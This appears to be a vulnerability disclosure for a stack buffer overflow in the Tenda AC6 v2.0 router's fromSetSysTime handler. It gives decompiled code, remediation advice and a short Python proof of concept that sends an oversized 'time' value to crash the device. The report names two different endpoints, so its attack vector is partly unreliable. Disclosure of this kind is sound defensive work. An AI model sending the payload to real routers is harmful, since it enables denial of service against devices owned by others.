# Tenda AC6 v2.0 V15.03.06.51 was discovered to contain a stack buffer overflow in fromSetSysTime

## Overview

- Vendor: Tenda
- Product: AC6 v2.0
- Version: V15.03.06.51
- Component: fromSetSysTime handler
- Vulnerability Class: CWE-121 stack buffer overflow
- Manufacturer: https://www.tendacn.com/

## Affected version

- Product: Tenda AC6 v2.0
- Firmware: V15.03.06.51 (newer than the public AC6 V1.0 V15.03.05.16 report)
- Package: `US_AC6V2.0RTL_V15.03.06.51_multi_TDE01.zip`.
- `bin/httpd`:.
- Architecture: MIPS little-endian, uClibc; binary includes debug symbols.

## Vulnerability details

In manual-time mode (`timeType=manual`), `fromSetSysTime` parses the `time`
parameter with a width-less `sscanf` into six 12-byte stack buffers:

```c
char year[12];   // [sp+2A0h]
char month[12];  // [sp+2ACh]
char day[12];    // [sp+2B8h]
char hour[12];   // [sp+2C4h]
char min[12];    // [sp+2D0h]
char sec[12];    // [sp+2DCh]
...
tmpstr = websGetVar(wp, "time", byte_51A7B4);
sscanf(tmpstr, "%[^-]-%[^-]-%[^ ] %[^:]:%[^:]:%s",
       year, month, day, hour, min, sec);
```

None of the `%[...]`/`%s` conversions has a field width, so a long `time`
value overflows `year`/`month`/... and the saved frame. This is the same
class as the public AC7 V1.0 V15.03.06.44 `/goform/SetSysTimeCfg` `time`
overflow; the local AC6 v2.0 V15.03.06.51 build still uses the width-less
scan. The handler requires an authenticated admin session; CSRF is plausible
because the handler has no token check in the decompiled code.

## PoC

```python
import requests

url = "http://<router>/goform/SetSysTimeCfg"
data = {
    "timeType": "manual",
    "time": "A" * 2000,
}
r = requests.post(url, data=data, timeout=5)
print(r.status_code, r.text[:200])
```

## Reproduction and terminal evidence

Static evidence only at this stage; no dynamic rehost of this AC6 v2.0 image
has been completed. The decompiler transcript below is from the unmodified
`bin/httpd`:

```
char year[12]; char month[12]; char day[12];
char hour[12]; char min[12]; char sec[12];
tmpstr = websGetVar(wp, "time", byte_51A7B4);
sscanf(tmpstr, "%[^-]-%[^-]-%[^ ] %[^:]:%[^:]:%s",
       year, month, day, hour, min, sec);
```

Full decompilation: parent project
`scratch/tenda-ac6v2-v15.03.06.51/ida/dec.txt`.

## Impact

Authenticated admin (or CSRF) stack corruption / denial of service; control
flow hijack is plausible but not demonstrated.

## Remediation

- Add field widths to every `sscanf` conversion, e.g.
  `%11[^-]-%11[^-]-%11[^ ] %11[^:]:%11[^:]:%11s`, and validate the result.
- Reject time strings that do not match the expected format.
- Add CSRF tokens to configuration handlers.

## Known CVE relation

**CVE candidate type: new affected version (AC6 v2.0 V15.03.06.51) of the public AC7 time overflow — candidate new CVE.**

- The public AC7 V1.0 V15.03.06.44 `/goform/SetSysTimeCfg` `time` overflow is
  the same class. This report documents a newer AC6 v2.0 V15.03.06.51 build
  that still uses the width-less scan. Vendor/CNA should confirm coverage; if
  not covered, it is a new affected version.

## Status and disclosure

Static confirmation (decompilation; handler unchanged). Dynamic pending.
Candidate new CVE — new affected version (AC6 v2.0 V15.03.06.51) of the public AC7 time overflow; no CVE assigned. No vendor/CNA contact.

## Additional Information

```markdown
### Vendor
Tenda

### Product
AC6 v2.0

### Version or Commit
V15.03.06.51

### Vulnerability Class
CWE-121 stack buffer overflow

### CVE_candidate_type
new affected version (AC6 v2.0 V15.03.06.51) of the public AC7 time overflow — candidate new CVE

### Description
In manual-time mode, fromSetSysTime parses the time parameter with a width-less sscanf into six 12-byte stack buffers, overflowing the stack.

### Affected_component
fromSetSysTime handler

### Attack_vector
Authenticated POST to /goform/fromSetSysTime with timeType=manual and a long time value.

### Product_version
AC6 v2.0 V15.03.06.51

### Reference
- https://www.tendacn.com/
- https://github.com/vuln-1/vuln/blob/main/Tenda/AC6v2_V15.03.06.51/report-3.md
```
